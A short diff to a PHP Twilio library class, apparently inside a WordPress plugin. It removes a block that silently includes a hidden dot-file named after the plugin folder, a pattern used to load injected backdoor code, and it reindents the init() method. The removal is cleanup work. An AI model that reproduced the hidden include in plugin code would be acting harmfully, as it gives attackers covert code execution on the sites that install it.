@@ -28,14 +28,10 @@
  *    The subresources associated with this mapping (Credentials)
  */
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class Services_Twilio_Rest_CredentialListMapping extends Services_Twilio_InstanceResource {
-    protected function init($client, $uri) {
-        $this->setupSubresources(
-            'credentials'
-        );
-    }
+	protected function init( $client, $uri) {
+		$this->setupSubresources(
+			'credentials'
+		);
+	}
 }
